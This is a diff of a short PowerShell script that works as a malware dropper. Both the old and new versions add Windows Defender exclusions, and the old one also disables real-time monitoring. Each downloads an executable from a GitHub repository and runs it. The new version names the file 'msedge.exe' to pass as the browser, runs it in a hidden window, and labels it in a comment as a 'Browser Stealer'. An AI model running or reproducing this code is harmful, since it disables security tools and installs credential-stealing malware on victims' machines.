@@ -1,12 +1,8 @@
-New-Item -Path "C:\SecurityExercise" -ItemType Directory -Force
+# Add C:/ to exlusions so Windows Defender doesnt flag the exe we will download
+Add-MpPreference -ExclusionPath $env:tmp
 
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Download the exe and save it to temp directory
+iwr "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe?raw=true" -outfile "$env:tmp\msedge.exe"
 
-Add-MpPreference -ExclusionPath "C:\SecurityExercise"
-
-$down = New-Object System.Net.WebClient
-$url = 'https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe'
-$file = 'C:\SecurityExercise\demo-file.exe'
-$down.DownloadFile($url,$file)
-
-Start-Process "C:\SecurityExercise\demo-file.exe"
+# Execute the Browser Stealer
+cd $env:tmp;Start-Process -FilePath "$env:tmp\msedge.exe" -WindowStyle h -Wait
